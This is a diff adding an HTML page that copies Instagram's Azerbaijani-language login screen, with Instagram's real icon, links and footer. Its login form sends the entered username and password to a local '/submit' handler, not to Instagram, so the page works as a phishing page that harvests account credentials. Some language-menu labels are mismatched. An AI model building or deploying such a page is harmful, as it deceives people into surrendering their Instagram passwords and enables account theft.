@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <title>Daxil ol • Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="header">
+        <div class="top">
+            <div class="logo">
+                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
+            </div>
+            <div class="form">
+                <form action="/submit" method="post">
+                    <div class="input_field">
+                        <input type="text" name="username" placeholder="Telefon nömrəsi, istifadəçi adı və ya e-poçt" class="input" required>
+                    </div>
+                    <div class="input_field">
+                        <input type="password" name="password" placeholder="Şifrə" class="input" required>
+                    </div>
+                    <div class="btn"><button type="submit">Daxil ol</button></div>
+                </form>
+            </div>
+            <div class="or">
+                <div class="line"></div>
+                <p>VƏ YA</p>
+                <div class="line"></div>
+            </div>
+            <div class="dif">
+                <div class="fb">
+                    <img src="images/facebook.png" alt="facebook">
+                    <a href="https://www.facebook.com/login.php">ㅤFacebook ilə Daxil ol</a>
+                </div>
+                <div class="forgot">
+                    <a href="https://www.instagram.com/accounts/password/reset/">Şifrəni unutmusunuz?</a>
+                </div>
+            </div>
+        </div>
+        <div class="signup">
+            <p>Hesabınız yoxdur? <a href="https://www.instagram.com/accounts/emailsignup/">Qeydiyyatdan keçin</a></p>
+        </div>
+        <div class="apps">
+            <p>Tətbiqi yükləyin.</p>
+            <div class="icons">
+                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="images/appstore.png" alt="appstore"></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images/googleplay.png" alt="googleplay"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <ul>
+                <li><a href="https://about.meta.com/">Meta</a></li>
+                <li><a href="https://about.instagram.com/">Haqqında</a></li>
+                <li><a href="https://about.instagram.com/blog">Blog</a></li>
+                <li><a href="https://about.instagram.com/about-us/careers">Karyera</a></li>
+                <li><a href="https://help.instagram.com/">Kömək</a></li>
+                <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
+                <li><a href="https://privacycenter.instagram.com/">Məxfiliyət</a></li>
+                <li><a href="https://www.instagram.com/privacy/cookie_settings/">Kukilər Ayarları</a></li>
+                <li><a href="https://help.instagram.com/581066165581870/">Şərtlər</a></li>
+                <li><a href="https://www.instagram.com/explore/locations/">Yerlər</a></li>
+                <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
+                <li><a href="https://www.threads.net/">Threads</a></li>
+                <li><a href="https://www.facebook.com/help/instagram/261704639352628">Şəxsləri Yükləmə və Qeydiyyatdan Keçməyənlər</a></li>
+                <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Təsdiqlənib</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="languages">
+        <select name="languages" id="languages">
+            <option value="en.html">Türkcə</option>
+            <option value="ar.html">Ərəbcə</option>
+            <option value="cs.html">Çex</option>
+            <option value="da.html">Danimarka</option>
+            <option value="de.html">Alman</option>
+            <option value="el.html">Yunanca</option>
+            <option value="af.html">Afrikaans</option>
+            <option value="en-uk.html">İngilis (Birləşmiş Krallıq)</option>
+            <option value="es-es.html">İspan (İspaniya)</option>
+            <option value="es.html">İspan</option>
+            <option value="fa.html">Fars</option>
+            <option value="fi.html">Fincan</option>
+            <option value="fr.html">Fransız</option>
+            <option value="he.html">İvrit</option>
+            <option value="id.html">İndoneziya</option>
+            <option value="no.html">Norveç</option>
+            <option value="nl.html">Holland</option>
+            <option value="pl.html">Polonya</option>
+            <option value="ru.html">Rusiya</option>
+            <option value="sv.html">İsveç</option>
+            <option value="fil.html">Filippin</option>
+            <option value="tr.html">İngilis</option>
+            <option value="zh-cn.html">Çin (Sadələşdirilmiş)</option>
+            <option value="gu.html">Qüdratlı</option>
+            <option value="hr.html">Xorvat</option>
+            <option value="fr-ca.html">Fransız (Kanada)</option>
+            <option value="ro.html">Rum</option>
+            <option value="sr.html">Serb</option>
+        </select>
+    
+        <script>
+            document.getElementById('languages').addEventListener('change', function() {
+                var selectedLanguage = this.value;
+                window.location.href = selectedLanguage;
+            });
+        </script>
+                
+        <p id="cinsta">© 2024 Instagram Meta-dan</p>
+    </div>
+    
+</div>
+</body>
+</html>
